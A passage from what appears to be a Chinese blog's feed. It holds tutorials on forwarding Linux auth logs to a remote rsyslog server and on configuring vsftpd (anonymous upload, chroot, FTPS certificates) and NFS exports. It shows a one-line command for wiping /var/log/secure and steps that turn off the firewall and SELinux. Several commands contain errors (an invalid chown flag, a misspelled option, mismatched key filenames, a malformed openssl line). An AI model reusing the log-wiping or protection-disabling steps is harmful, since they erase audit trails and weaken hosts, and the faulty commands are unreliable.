rel="noopener">https://www.cnblogs.com/chunguang/p/5583875.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h6 id=&quot;仅仅是简单把网上的文章放在一起，方便自己学习&quot;&gt;&lt;a href=&quot;#仅仅是简单把网上的文章放在一起，方便自己学习&quot; class=&quot;headerlink&quot; title=&quot;仅仅是简单把网上的文章放在一起，方便自己学习&quot;&gt;&lt;/a&gt;仅仅是简单把网上的文章放在一起，方便自己
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="安全" scheme="http://www.xpshuai.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="代码审计" scheme="http://www.xpshuai.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Linux日志异地备份</title>
    <link href="http://www.xpshuai.cn/Linux%E6%97%A5%E5%BF%97%E5%BC%82%E5%9C%B0%E5%A4%87%E4%BB%BD/"/>
    <id>http://www.xpshuai.cn/Linux日志异地备份/</id>
    <published>2020-04-16T07:49:02.000Z</published>
    <updated>2020-05-16T16:13:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="日志的异地备份"><a href="#日志的异地备份" class="headerlink" title="日志的异地备份"></a>日志的异地备份</h2><blockquote><p>日志服务器的建立尤其重要</p></blockquote><p>这里使用Centos的登录日志做实验</p><p><code>tail -f /var/log/secure</code> 实时查看日志变化</p><p><code>echo &quot; &quot; &gt; var/log/secure</code> 最简单的清理日志</p><h4 id="常见日志文件"><a href="#常见日志文件" class="headerlink" title="常见日志文件"></a>常见日志文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/<span class="built_in">log</span>/messages        大多数系统日志信息记录在此处</span><br><span class="line">/var/<span class="built_in">log</span>/secure            安全和身份认证相关的信息和错误的日志文件</span><br><span class="line">/var/<span class="built_in">log</span>/mallog            与邮件服务器相关的日志文件</span><br><span class="line">/var/<span class="built_in">log</span>/cron            与定时任务相关的日志文件</span><br><span class="line">/var/<span class="built_in">log</span>/boot.log        与系统启动有关的日志文件</span><br></pre></td></tr></table></figure><h4 id="发送方："><a href="#发送方：" class="headerlink" title="发送方："></a>发送方：</h4><h6 id="考虑问题"><a href="#考虑问题" class="headerlink" title="考虑问题"></a>考虑问题</h6><p>1.我发送什么信息表到日志服务器</p><p>2.考虑发送到ip哪个端口</p><p>3.使用什么协议</p><h6 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h6><p>配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/rsyslog.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里配置登录日志， 指定日志类别和等级，协议和端口</span></span><br><span class="line"><span class="comment">### begin forwarding rule ###</span></span><br><span class="line"><span class="comment">#*.* @@remote-host:514      @@代表使用TCP</span></span><br><span class="line"></span><br><span class="line">authpriv.* @@192.168.0.111:514</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### Note：</span></span><br><span class="line"><span class="comment"># 1.暂时关闭防火墙 </span></span><br><span class="line">setup  <span class="comment"># 关闭防火墙</span></span><br><span class="line">iptables -nL <span class="comment"># 查看一下</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.关闭SELinux</span></span><br><span class="line">setenforce 0</span><br><span class="line">getenforce</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启rsyslog 服务</span></span><br></pre></td></tr></table></figure><h4 id="接收方："><a href="#接收方：" class="headerlink" title="接收方："></a>接收方：</h4><h6 id="考虑问题-1"><a href="#考虑问题-1" class="headerlink" title="考虑问题"></a>考虑问题</h6><p>1.收谁的日志</p><p>2.收完存哪</p><p>3.用什么协议</p><h6 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h6><p>配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/rsyslog.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定协议和端口</span></span><br><span class="line"><span class="comment"># Provides TCP syslog reception</span></span><br><span class="line"><span class="variable">$ModLoad</span> imtcp</span><br><span class="line"><span class="variable">$InputTCPServerRun</span> 514</span><br><span class="line"></span><br><span class="line"><span class="comment"># 收谁的，存哪</span></span><br><span class="line"><span class="comment"># 按照ip地址来收</span></span><br><span class="line">:fromhost-ip, isequal, <span class="string">"192.168.0.100"</span> /var/<span class="built_in">log</span>/client_log/192.168.0.100.log</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重启rsyslog 服务</span></span><br><span class="line"></span><br><span class="line">netstat -antlp |grep 514  <span class="comment"># 查看端口是否开始监听了</span></span><br></pre></td></tr></table></figure><p>完成</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;日志的异地备份&quot;&gt;&lt;a href=&quot;#日志的异地备份&quot; class=&quot;headerlink&quot; title=&quot;日志的异地备份&quot;&gt;&lt;/a&gt;日志的异地备份&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;日志服务器的建立尤其重要&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里使
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="日志" scheme="http://www.xpshuai.cn/tags/%E6%97%A5%E5%BF%97/"/>
    
      <category term="异地备份" scheme="http://www.xpshuai.cn/tags/%E5%BC%82%E5%9C%B0%E5%A4%87%E4%BB%BD/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu server-文件服务</title>
    <link href="http://www.xpshuai.cn/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/"/>
    <id>http://www.xpshuai.cn/ubuntu-server-文件服务/</id>
    <published>2020-04-14T08:48:09.000Z</published>
    <updated>2020-05-14T16:51:28.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件服务"><a href="#文件服务" class="headerlink" title="文件服务"></a>文件服务</h1><blockquote><p>我的就是你的 -  你的还是你的</p></blockquote><p>网络诞生最初的动因是去中心化和资源共享<br>文件是初期最主要的资源共享形式（把文件存放在集中的位置供大家访问）  </p><p>去中心化是另外一个话题</p><ul><li>早期的军事需求</li><li>现在的信任需求</li></ul><h2 id="FTP服务"><a href="#FTP服务" class="headerlink" title="FTP服务"></a><font color="red">FTP服务</font></h2><p>最古老的就是FTP  </p><ul><li>产生于安全出现之前</li><li>明文传输一切</li><li>目前主要用于公开提供的文件下载服务(目前还没消亡)</li><li>使用简单、兼容性好</li><li>还有SFTP、FTPS等</li></ul><h6 id="FTP服务端软件"><a href="#FTP服务端软件" class="headerlink" title="FTP服务端软件"></a>FTP服务端软件</h6><ul><li>Server U</li><li>vsftpd</li><li>Proftpd</li></ul><h6 id="为了安全考虑"><a href="#为了安全考虑" class="headerlink" title="为了安全考虑"></a>为了安全考虑</h6><ul><li>独立部署于企业防火墙之外</li><li>只读挂载存储或采用只读存储设备(CD / DVD)</li></ul><h2 id="vsftp安装和配置和管理"><a href="#vsftp安装和配置和管理" class="headerlink" title="vsftp安装和配置和管理"></a><font color="red">vsftp安装和配置和管理</font></h2><p>vsftpd  –  灵活、安全的FTP服务端软件</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vsftpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装过程中生成ftp账号（anonymous） 主目录在：/srv/ftp</span></span><br><span class="line"><span class="comment"># 默认是21端口进行会话</span></span><br></pre></td></tr></table></figure><p>FTP账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装完之后会自动创建一个ftp账号（这个账号是不能使用shell和登录机器 ）</span></span><br><span class="line">/etc/passwd    <span class="comment"># bin/false   表示不能使用shell</span></span><br><span class="line">/etc/shadow    <span class="comment"># *表示不能使用终端</span></span><br><span class="line">/srv/ftp   <span class="comment"># ftp用户主目录</span></span><br></pre></td></tr></table></figure><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>两种配置模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">anonymous<span class="comment"># 匿名模式（适用于公开共享文件） -- vsftpd安装好之后是默认禁用匿名登陆的</span></span><br><span class="line">Standard<span class="comment"># 认证模式</span></span><br></pre></td></tr></table></figure><p>常见FTP客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用哪个账号登录，看到的文件就是哪个用户的主目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.使用命令行连接ftp服务器</span></span><br><span class="line">ftp 192.168.1.130</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.浏览器</span></span><br><span class="line">ftp://192.168.111.130</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.ftp客户端访问程序（FileZilla）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.文件同步客户端软件</span></span><br></pre></td></tr></table></figure><h5 id="1-匿名登录"><a href="#1-匿名登录" class="headerlink" title="1.匿名登录"></a>1.匿名登录</h5><p>配置文件位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/vsftpd.conf    <span class="comment"># 主配置文件</span></span><br></pre></td></tr></table></figure><p><strong>开启匿名模式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/vsftpd.conf </span><br><span class="line"><span class="comment"># 修改内容为</span></span><br><span class="line">anonymous_enable=YES<span class="comment"># 启用匿名账号登录</span></span><br><span class="line">local_enable=NO<span class="comment"># 禁用认证用户登录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启vsftpd服务，检查状态</span></span><br><span class="line"></span><br><span class="line">然后使用账号anonymous登录(命令行需要,其他方式不用)，密码不用输即可()</span><br><span class="line">看到的目录是`/srv/ftp/`</span><br></pre></td></tr></table></figure><p><strong>开启匿名账号上传</strong><br>默认：匿名账号是不允许匿名上传的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/vsftpd.conf </span><br><span class="line"><span class="comment"># 修改内容</span></span><br><span class="line">write_enable=YES<span class="comment"># 全局设置（以下配置生效的依赖）</span></span><br><span class="line">anon_upload_enable=YES<span class="comment"># 允许匿名上传文件</span></span><br><span class="line">anon_mkdir_write_enable=YES<span class="comment"># 允许匿名创建目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务，检查状态</span></span><br><span class="line">sudo systemctl restart vsftpd.service</span><br><span class="line"></span><br><span class="line">但是还是不能上传的（因为vsftpd强制禁止在根目录下匿名上传）</span><br><span class="line">Note： ftp的主目录是不能进行上传文件的，因为这个目录对同组用户没有写的权限(`ls -ld`查看当前目录的权限)，就算你chmod修改了权限也是不行的</span><br><span class="line">【解决办法】:在根目录新建文件然后上传</span><br><span class="line">sudo mkdir /srv/ftp/upload  <span class="comment"># 创建上传目录</span></span><br><span class="line">sudo chown ftp:ftp /srv/ftp/upload <span class="comment"># 配置新建文件系统属主数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 继续新增配置  /etc/vsftpd.conf </span></span><br><span class="line">anon_umask=022  <span class="comment"># 上传文件权限掩码(让上传的文件配置不同的权限 -- 看自己需要来配置)</span></span><br><span class="line">anon_other_wrote_enable=YES<span class="comment"># 允许删除和重命名(否则删除不了也无法重命名)</span></span><br></pre></td></tr></table></figure><p><strong>修改FTP主目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /srv/files/ftp</span><br><span class="line">sudo chown -d /srv/files/ftp ftp</span><br></pre></td></tr></table></figure><p><strong>文件传输日志</strong><br>默认是开启的，可以查看恶意文件上传记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/vsftpd.conf </span></span><br><span class="line"></span><br><span class="line">xferlog_enable=YES<span class="comment"># 默认开启</span></span><br><span class="line">xferlog_file=/var/<span class="built_in">log</span>/vsftpd.log  <span class="comment"># 默认日志存放位置(注释不注释他都默认往里面写，可修改)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果修改，重启服务</span></span><br></pre></td></tr></table></figure><p><strong>其他配置</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">idle_session_timeout=600<span class="comment"># 会话超时时长</span></span><br><span class="line">no_anon_password=YES<span class="comment"># 命令行登录禁用密码提示</span></span><br><span class="line">hide_ids=YES<span class="comment"># 显示属主/数组名称，而不显示uid和gid(uid会比较敏感)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure><p><strong>端口</strong></p><ul><li>会话指令 -&gt; TCP  21端口       </li><li>数据传输模式<ul><li>主动模式（受客户端防火墙影响）– 客户端随机产生一个端口，告诉服务器  -&gt;服务端只使用 20端口        </li><li>被动模式 （兼容性好，建议使用）         – 服务端告诉客户端使用哪个端口传输</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用什么模式，客户端说了算</span></span><br><span class="line"><span class="comment"># 都是客户端随机产生一个端口，告诉服务端</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 被动模式连接</span></span><br><span class="line">ftp -p 192.168.0.130</span><br></pre></td></tr></table></figure><p><img src="/ubuntu-server-文件服务/20200413153011895_32240.png" alt></p><p>限定<code>被动模式</code>数据通信端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/vsftpd.conf   新增配置</span></span><br><span class="line"><span class="comment"># 开放一个端口的范围(尽量少开) </span></span><br><span class="line">pasv_min_port=40001</span><br><span class="line">pasv_max_port=40101</span><br></pre></td></tr></table></figure><p>然后在服务器端边界防火墙上开放上述100个端口</p><h5 id="2-身份认证登录"><a href="#2-身份认证登录" class="headerlink" title="2.身份认证登录"></a>2.身份认证登录</h5><p><strong>身份认证登录TFP</strong></p><ul><li>安装之后的默认配置</li><li>不能上传</li><li>可回溯到根目录（<code>存在安全隐患!!!</code> –&gt; 使用chroot来解决）</li></ul><p><strong>chroot</strong><br>chroot 将<code>所有</code>登录用户锁定在自己的主目录里（防止目录回溯）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件 sudo vim /etc/vsftpd.conf</span></span><br><span class="line"><span class="comment"># 全局的配置参数(对所有用户)</span></span><br><span class="line">chroot_local_user=YES   <span class="comment"># 但是chroot的根目录不能是可写的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认主目录可写， 但是chroot的根目录不能是可写的，vsftp的禁止用户登录，好猫短   ————&gt; 怎么办呢？看下面</span></span><br></pre></td></tr></table></figure><p><strong>（接上文）两种解决办法:</strong><br>1.为FTP登录指定新的主目录（建议使用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir ~/ftp &amp;&amp; chmod -w ftp    <span class="comment"># 新建主目录，并删除写入权限</span></span><br><span class="line"><span class="comment"># sudo vim /etc/vsftpd.conf</span></span><br><span class="line">local_root=/home/xps/ftp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端只能看到这个目录里面，跳不出去</span></span><br></pre></td></tr></table></figure><p>2.允许根目录写入（不建议，存在安全风险）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件 sudo vim /etc/vsftpd.conf</span></span><br><span class="line">write_enable=YES</span><br><span class="line">local_root=/home/xps</span><br><span class="line">allow_writeable_chroot=YES</span><br></pre></td></tr></table></figure><p><strong>chroot 将<code>指定</code>登录用户锁定在自己的主目录里（防止目录回溯）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件 sudo vim /etc/vsftpd.conf</span></span><br><span class="line"><span class="comment"># chroot_local_user=YES   # 注释掉前面配置的全局的配置项</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用用户列表功能</span></span><br><span class="line">chroot_list_enable=YES  <span class="comment"># 如果chroot_local_user=YES也开启了，就起了相反的作用(除了指定列表里面的用户之外, 都锁定在主目录里)</span></span><br><span class="line"><span class="comment"># 指定用户列表文件</span></span><br><span class="line">chroot_list_file=/etc/vsftpd.chroot_list</span><br><span class="line"><span class="comment"># 编辑用户账号列表</span></span><br><span class="line">vim /etc/vsftpd.chroot_list</span><br><span class="line"><span class="comment"># 添加用户</span></span><br><span class="line">xps</span><br><span class="line">ftp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure><p>禁止指定FTP登录账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/ftpusers  <span class="comment"># 默认禁止FTP登录账号(将用户加入进去)</span></span><br></pre></td></tr></table></figure><p><strong>上传文件权限掩码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 跟匿名用户的配置是类似的</span></span><br><span class="line">local_umask=022</span><br></pre></td></tr></table></figure><p><strong>文件同步客户端</strong><br>自动把我电脑的新的文件，上传到FTP服务器(类似于备份) – 有一些第三方软件(ubuntu自带的同步软件<code>backup</code>等)</p><h2 id="FTP安全"><a href="#FTP安全" class="headerlink" title="FTP安全"></a><font color="red">FTP安全</font></h2><h6 id="1-FTPS-FTP-over-Secure-Socket-Layer-SSL"><a href="#1-FTPS-FTP-over-Secure-Socket-Layer-SSL" class="headerlink" title="1.FTPS: FTP over Secure Socket Layer(SSL)"></a>1.<code>FTPS</code>: FTP over Secure Socket Layer(SSL)</h6><blockquote><p>账号无需shell登录权限  </p></blockquote><p>基于证书的加密</p><p>开启FTPS：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安全性--指的是在数据传输过程中不会被别人嗅探</span></span><br><span class="line">ssl_enable=YES<span class="comment"># 启动FTPS</span></span><br><span class="line">rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem   <span class="comment"># 公钥</span></span><br><span class="line">rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key  <span class="comment"># 私钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line"><span class="comment"># 然后再连接的时候就是加密的了(浏览器需要ftps://ip)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 怎么加密的呢?</span></span><br><span class="line"><span class="comment"># 简单来说：安装FTP时候默认会生成一对公钥和私钥</span></span><br><span class="line"><span class="comment"># 不建议使用安装FTP时候默认生成的证书，建议手动生成(每个应用一个证书, 每个证书有效期一两年)</span></span><br></pre></td></tr></table></figure><p><strong>手动生成证书 –&gt; 替换默认证书(安全考虑)：</strong><br>1.生成秘钥文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用ssl的一个开源组件openssl</span></span><br><span class="line">openssl genrsa -des3 -out ftp.key 4096  <span class="comment"># 1024的已经不安全了</span></span><br><span class="line"><span class="comment"># 然后设置密码保护</span></span><br></pre></td></tr></table></figure><p>2.生成不加密的秘钥文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先还原为明文的密钥对</span></span><br><span class="line">openssl rsa -<span class="keyword">in</span> ftp.key -out ftp.key.insecure  <span class="comment"># 用完就删掉这个insecure文件</span></span><br><span class="line"><span class="comment"># 改名(这是加密的)</span></span><br><span class="line">mv ftp.key  server.key.secure </span><br><span class="line"><span class="comment"># 改名(这是明文的)</span></span><br><span class="line">mv server.key.insecure  ftp.key</span><br></pre></td></tr></table></figure><p>3.生成证书请求文件(使用上面的明文秘钥)   – 实验使用的自签名证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key ftp.key -out ftp.csr</span><br><span class="line"><span class="comment"># 然后输入一些证书的信息</span></span><br></pre></td></tr></table></figure><p>这里使用自签名证书(生产环境建议由证书颁发机构前面生成证书)<br>3.生成自签名证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -days 365 -<span class="keyword">in</span> ftp.csr -signkey ftp.key -out ftp.pem   <span class="comment"># -days 365有效期</span></span><br></pre></td></tr></table></figure><p>4.部署证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ftp.key放到一个更安全的目录去</span></span><br><span class="line">sudo cp ftp.key /etc/ssl/private/  <span class="comment"># 此目录root才能看</span></span><br><span class="line">sudo cp ftp.pem /etc/ssl/certs/</span><br></pre></td></tr></table></figure><p>5.修改<code>/etc/vsftpd.cong</code>中的key和公钥为刚才手动生成的证书， 然后重启服务</p><p>上面的操作也可以合并为一条命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -node -days 365 -newkey rsa:4096 -keyout /etc/ssl/private/vsftpd.key -out /etc/ssl/private/vsftpd.pem</span><br></pre></td></tr></table></figure><h6 id="2-SFTP-基于SSH加密隧道传输文件"><a href="#2-SFTP-基于SSH加密隧道传输文件" class="headerlink" title="2.SFTP: 基于SSH加密隧道传输文件"></a>2.<code>SFTP</code>: 基于SSH加密隧道传输文件</h6><blockquote><p>账号需要shell登录权限（可设置禁止权限）</p></blockquote><p>远程登录那一章已经学了</p><h2 id="NFS服务"><a href="#NFS服务" class="headerlink" title="NFS服务"></a><font color="red">NFS服务</font></h2><blockquote><p>适用于类UNIX系统</p></blockquote><ul><li>NFS – Network File System</li><li>最早由SUN公司开发</li><li>类unix平台最主要的文件共享方法</li><li>基于RPC(Remote Procedure Call)协议<ul><li>NFS是一个RPC Server （v3 、v4）</li></ul></li><li>协议本身不加密，可结合SSH，Kerberos实现加密</li><li>隐藏式身份验证（难点）</li><li>权限配置是关键</li><li>服务端口: TCP <code>2049</code></li></ul><p><strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nfs-kernel-server  <span class="comment"># 服务端</span></span><br><span class="line">sudo apt-get install nfs-common<span class="comment"># 客户端</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装完，服务已经都启动了</span></span><br><span class="line">ps -ef |grep rpc</span><br><span class="line">ps -ef |grep nfs</span><br></pre></td></tr></table></figure><p><strong>进程</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rpcbind<span class="comment"># RPC服务进程</span></span><br><span class="line">nfsd<span class="comment"># NFS主进程(身份识别)</span></span><br><span class="line">mountd<span class="comment"># 根据 /etc/exports 配置验证权限</span></span><br><span class="line">lockd<span class="comment"># 锁定（需C/S同时启用）</span></span><br><span class="line">statd<span class="comment"># 一致性（需C/S同时启用）</span></span><br></pre></td></tr></table></figure><p><strong>身份识别</strong></p><ul><li>客户端提供 UID / GID (与用户名、组名无关)</li><li>服务器按客户端UID /GID 赋权</li><li>若服务器无客户端UID / GID账号，则将客户端映射为匿名账号<ul><li>nobody / nogroup (uid: 65534)</li></ul></li><li>客户端使用root账号（UID 0），默认映射为匿名账号<ul><li>可修改配置文件映射 UID 0 为服务端 ROOT （存在安全隐患）</li></ul></li></ul><blockquote><p>如果客户端uid和服务端uid相同，则客户端会获得服务器端账号的权限；若不同，则客户端获取服务端的nobody权限(除非客户端是root账号,且服务端启用了客户端的root映射为服务端的root)</p></blockquote><p>隐式的身份认证</p><p><strong>权限体系</strong></p><ul><li>1.共享权限</li><li>2.文件系统权限</li></ul><p><strong>配置</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/exports<span class="comment"># 主配置文件</span></span><br><span class="line"><span class="comment"># 内容：共享目录,谁可以访问我, 权限，(sync是数据先写到内存在硬盘可靠,async是写到内存然后写的硬盘速度快)，no_subtree_check是不进行子目录的检查(建议使用)</span></span><br><span class="line">/exports/public192.168.1.0/24(rw,sync,no_subtree_check)  <span class="comment"># 允许访问的范围可以使用通配符： *.lab.com</span></span><br><span class="line">no_root_squash<span class="comment"># 禁用root默认映射为nobody(加在上面括号中的配置中)</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">sudo mkdir -p /exports/public<span class="comment"># 创建共享目录</span></span><br><span class="line">sudo chown nobody:nogroup /exports/public<span class="comment"># 设置权限</span></span><br><span class="line">sudo systemctl restart nfs-kernel-server<span class="comment"># 重启服务</span></span><br><span class="line"></span><br><span class="line">sudo exportfs<span 